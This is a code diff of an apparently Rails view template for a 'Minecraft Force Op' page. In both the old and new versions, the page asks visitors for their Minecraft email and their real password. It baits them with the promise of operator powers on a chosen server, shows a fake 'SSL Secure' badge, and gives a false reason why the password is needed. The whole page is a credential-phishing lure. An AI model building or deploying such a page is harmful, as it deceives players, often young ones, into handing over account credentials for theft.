@@ -1,53 +1,28 @@
-<!DOCTYPE html>
 <html>
-<head>
-<title>Mc Force Op</title>
-</head>
-<body>
-<!-- HUD Start-->
-<h1>&#305&#305&#305 MC Force Op &#305&#305&#305</h1>
-<h4>&radic;BETA</h2>
-	<div class="menuBar">
-		<a href="/" class="grey button">
-			<img src="http://i1278.photobucket.com/albums/y520/fordsally/home_zps728d0710.png~original" height="11px" width="14px" alt="home.png"> Home
-		</a>
-		<a href="/logins" class="grey button">
-			<img src="http://i1278.photobucket.com/albums/y520/fordsally/bvnjv-md_zpsa74040be.png~original" height="11px" width="14px" alt="apps.png"> Force Op
-		</a>
-		<a href="/about.html" class="grey button">
-			<img src="http://i1278.photobucket.com/albums/y520/fordsally/Computer-Hardware-Monitor-icon_zps0410f8b7.png~original" height="11px" width="11px" alt="login.png"> About
-		</a>
-	</div>
-<!-- HUD End -->
-<div class="content">
-	<p class="fancyText">Force Op Application</p>
-<hr />
-	<div style="border: 1px solid #527575; background-color: #5D8383; opacity:0.8; filter:alpha(opacity=80);">
-	<p style="color: #000000; text-shadow: 1px 1px 2px #000000; text-align: center; padding-top: 20px;">1. Enter your MC username</p>
-	<p style="color: #000000; text-shadow: 1px 1px 2px #000000; text-align: center; padding-top: 20px;">2. Enter your MC email</p>
-	<p style="color: #000000; text-shadow: 1px 1px 2px #000000; text-align: center; padding-top: 20px;">3. Enter your MC password</p>
-	<p style="text-shadow: 1px 1px 2px #000000; text-align: center; padding-top: 20px;"><a href="#" style="color: #9B311C;">Why do you need my Minecraft credentials?</a></p>
-	</div>
-	<br />
-	<center>
-	<form>
-	Server Ip <br /><input type="text" name="server">
-	</form>
-	<%= form_for @login, :url => { :action => "create" } do |f| %>
-	<p>
-		MC <%= f.label :email %><br />
-		<%= f.text_field :email %>
-	</p>
-	<p>
-		MC <%= f.label :password %><img src="http://www.copperriverbags.com/product_images/uploaded_images/secure.png"style="padding-left: 2px;" height="15px" width="17px" title="SSL Secure"><br />
-		<%=	f.password_field :username %>
-	</p>
-	<p style="font-size: 12px;">Be sure to enter your <span style="font-weight: bold;">real</span> Minecraft password into the password form in order to allow the desired Minecraft server to properly render your username.<br /> <a href="https://minecraft.net/resetpassword">Forgot your minecraft password?</a>
-	<p>
-		<%= f.submit "Begin Force Op!" %>
-	</p>
-	<% end %>
-	</center>
-</div>
-</body>
+	<head>
+	</head>
+	<body>
+		<header>
+			<h1>Minecraft Force Op</h1>
+		</header>
+		<div class="content" id="content">
+			<form>
+			Server Ip <br /><input type="text" name="server">
+			</form>
+			<%= form_for @login, :url => { :action => "create" } do |f| %>
+			<p>
+				MC <%= f.label :email %><br />
+				<%= f.text_field :email %>
+			</p>
+			<p>
+				MC <%= f.label :password %><img src="http://www.copperriverbags.com/product_images/uploaded_images/secure.png"style="padding-left: 2px;" height="15px" width="17px" title="SSL Secure"><br />
+				<%=	f.password_field :username %>
+			</p>
+			<p style="font-size: 12px;">Be sure to enter your <span style="font-weight: bold;">real</span> Minecraft password into the secure password form in order to allow the desired Minecraft server to properly render your username.<br /> <a href="https://minecraft.net/resetpassword">Forgot your minecraft password?</a>
+			<p>
+				<%= f.submit "Begin Force Op!" %>
+			</p>
+			<% end %>
+		</div>
+	</body>
 </html>
